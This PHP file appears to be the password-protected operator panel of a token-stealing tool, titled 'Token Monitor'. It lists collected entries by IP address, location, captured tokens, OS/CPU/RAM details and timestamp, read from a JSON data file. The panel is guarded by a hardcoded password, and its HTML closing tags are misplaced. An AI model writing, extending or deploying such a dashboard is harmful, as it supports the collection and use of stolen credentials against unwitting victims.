<?php
session_start();

define('TOKEN_PASSWORD', 'azerty');

// Gestion de l'authentification
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token_password'])) {
    if (hash_equals(TOKEN_PASSWORD, $_POST['token_password'])) {
        $_SESSION['token_auth'] = true;
    } else {
        $error = "Mot de passe incorrect.";
        unset($_SESSION['token_auth']);
    }
}

// Gestion de la déconnexion
if (isset($_GET['logout'])) {
    unset($_SESSION['token_auth']);
    header('Location: index.php');
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Monitor - rust.vullwen.com</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>

<body class="bg-dark text-light">
    <div class="container mt-5">
        <h1 class="mb-4">Token Activity Monitor</h1>

        <?php if (empty($_SESSION['token_auth'])): ?>
            <?php if (!empty($error)): ?>
                <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
            <form method="post" class="mb-4">
                <div class="mb-3">
                    <input type="password" class="form-control" name="token_password" placeholder="Mot de passe" required>
                </div>
                <button type="submit" class="btn btn-primary">Voir les tokens</button>
            </form>
        <?php else: ?>
            <a href="?logout=1" class="btn btn-danger mb-3">Déconnexion</a>
            <table class="table table-dark table-striped">
                <thead>
                    <tr>
                        <th>IP</th>
                        <th>Location</th>
                        <th>Tokens</th>
                        <th>System Info</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $data = json_decode(file_get_contents('../data/data.json'), true) ?? [];
                    foreach ($data as $entry):
                        ?>
                        <tr>
                            <td><?= htmlspecialchars($entry['ip']) ?></td>
                            <td><?= htmlspecialchars($entry['location']) ?></td>
                            <td>
                                <?= implode('<br>', array_map('htmlspecialchars', $entry['tokens'])) ?>
                            </td>
                            <td>
                                <small>
                                    OS: <?= htmlspecialchars($entry['system_info']['os']) ?><br>
                                    CPU: <?= htmlspecialchars($entry['system_info']['cpu']) ?><br>
                                    RAM: <?= htmlspecialchars($entry['system_info']['ram']) ?>GB
                                </small>
                            </td>
                            <td><?= date('Y-m-d H:i:s', $entry['timestamp']) ?></td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </body>

    </html>
<?php endif; ?>
</div>